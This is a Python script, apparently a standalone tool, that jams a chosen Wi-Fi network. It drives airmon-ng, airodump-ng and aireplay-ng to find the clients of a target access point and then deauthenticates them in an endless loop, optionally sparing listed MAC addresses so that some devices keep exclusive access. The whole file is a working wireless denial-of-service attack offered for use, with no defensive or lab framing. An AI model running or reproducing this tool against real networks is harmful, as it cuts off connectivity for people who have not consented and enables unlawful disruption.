#!/usr/bin/python3
"""
Jam a network, disallowing access for everyone or
ensuring exclusive access for some
"""
import subprocess
import os
import sys
import atexit
import argparse
import time
import shutil
import csv

clients = []


def _remove_csv_file():
    """
    Remove airodump-ng csv output file
    """
    try:
        os.remove("network_jammer.csv-01.csv")
    except FileNotFoundError:
        pass


def _parse_args():
    """
    Parse command line arguments and return the argparse namespace
    """
    parser = argparse.ArgumentParser(
        description=_parse_args.__module__.__doc__)
    parser.add_argument("interface",
                        help="Interface to operate on")
    parser.add_argument("--channel",
                        required=True, type=int,
                        help="Channel of AP")
    parser.add_argument("--bssid", required=True,
                        help="BSSID of AP")
    parser.add_argument("--essid",
                        help="ESSID of AP")
    parser.add_argument("--enable-5ghz", dest="five_ghz",
                        help="Operate on 5GHz networks too")
    parser.add_argument("--no-broadcast-deauth",
                        action="store_true",
                        help="Do not deauthenticate broadcast")
    parser.add_argument("--exclude",
                        nargs="+", default=[],
                        help="Exclude certain MAC addresses from"
                        "deauthentication (implies --no-broadcast-deauth)")
    parser.add_argument("--discovery-timeout",
                        type=int, default=3,
                        help="For how long list of associated clients"
                        "is valid before they are discovered again")
    namespace = parser.parse_args(sys.argv[1:])
    if len(namespace.exclude) != 0:
        namespace.exclude = [exclusion.lower()
                             for exclusion in namespace.exclude]
        namespace.no_broadcast_deauth = True
    return namespace


def _find_tool(name):
    """
    Find a tool and return it's path
    or if not found, fail
    """
    path = shutil.which(name)
    if path is None:
        print(f"'{name}' is not found")
        sys.exit(1)
    return path


def _enable_monitor_mode(config, airmon_path):
    """
    Enable monitor mode on an interface
    """
    process = subprocess.Popen(
        [airmon_path, "start", config.interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE)
    if process.wait() != 0:
        print("Putting interface in monitor mode failed:")
        print(f"Process stderr: {process.stderr.read()}")
        sys.exit(1)


def _switch_channel(config, airmon_path):
    """
    Change channel
    """
    print(f"Switching to channel {config.channel}...")
    cmdline = [
        airmon_path,
        "start",
        config.interface,
        str(config.channel)
    ]
    process = subprocess.Popen(cmdline,
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.PIPE)
    if process.wait() != 0:
        print("Switching to channel {channel} failed:")
        print(f"Process stderr: {process.stderr.read()}")
        sys.exit(1)


def _read_airodump_csv():
    """
    Read airodump's csv output, returning a list of it's lines
    """
    try:
        with open("network_jammer.csv-01.csv", "r",
                  encoding="utf-8") as stream:
            lines = stream.read().replace("\0", "").split("\n")
    except FileNotFoundError:
        print("Client discovery failed")
        sys.exit(1)
    os.remove("network_jammer.csv-01.csv")
    return lines


def _parse_airodump_csv(config, lines):
    """
    Parse airodump's csv output
    """
    clients.clear()
    csv_reader = csv.reader(lines,
                            delimiter=",",
                            skipinitialspace=True)
    parse_clients = False
    for row in csv_reader:
        if len(row) < 1:
            continue
        if row[0].strip() == "Station MAC":
            # Contains client information
            parse_clients = True
            continue
        if parse_clients:
            if row[5] == config.bssid:
                clients.append(row[0])
                print(f"Discovered client: {row[0]}")


def _discover_clients(config, airodump_path):
    """
    Discover all clients connected to the target AP
    """
    print("Discovering clients...")
    cmdline = [
        airodump_path,
        config.interface,
        "-a",
        "-K",
        "1",
        "-I",
        str(config.discovery_timeout),
        "-w",
        "network_jammer.csv",
        "--ignore-negative-one",
        "--bssid",
        config.bssid,
        "--output-format",
        "csv",
    ]
    if config.essid is not None:
        cmdline.extend(["--essid", config.essid])
    if config.five_ghz:
        cmdline.extend(["--band", "abg"])
    process = subprocess.Popen(cmdline,
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.PIPE)
    time.sleep(config.discovery_timeout + 1)
    if process.poll() is not None:
        print("airodump process died")
        print(f"Process stderr: {process.stderr.read()}")
        sys.exit(1)
    process.terminate()
    lines = _read_airodump_csv()
    _parse_airodump_csv(config, lines)


def _deauth_clients(config, aireplay_path, airmon_path):
    """
    Deauthenticate all clients discovered before
    """
    for client in clients:
        _switch_channel(config, airmon_path)
        if client.lower() not in config.exclude:
            cmdline = [
                aireplay_path,
                config.interface,
                "-0",
                "2",
                "-a",
                config.bssid,
                "-c",
                client,
                "--ignore-negative-one"
            ]
            print(f"Deauthenticating {client}...")
            process = subprocess.Popen(cmdline)
            if process.wait() != 0:
                print(f"Deauthenticating {client} failed")
        else:
            print(f"Excluding {client} from deauthentication")
    if not config.no_broadcast_deauth:
        _switch_channel(config, airmon_path)
        cmdline = [
            aireplay_path,
            config.interface,
            "-0",
            "5",
            "-a",
            config.bssid,
            "--ignore-negative-one"
        ]
        print("Deauthenticating broadcast...")
        process = subprocess.Popen(cmdline)
        if process.wait() != 0:
            print("Deauthenticating broadcast failed")


def main():
    """
    Main function of jam_network
    """
    config = _parse_args()
    if os.getuid() != 0:
        print(f"{os.path.basename(sys.argv[0])} needs to be run as root")
        sys.exit(1)
    airmon_path = _find_tool("airmon-ng")
    airodump_path = _find_tool("airodump-ng")
    aireplay_path = _find_tool("aireplay-ng")
    print("Putting interface in monitor mode")
    _enable_monitor_mode(config, airmon_path)
    atexit.register(_remove_csv_file)
    while True:
        _discover_clients(config, airodump_path)
        if len(clients) == 0:
            print("No clients found!")
            continue
        _deauth_clients(config, aireplay_path, airmon_path)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
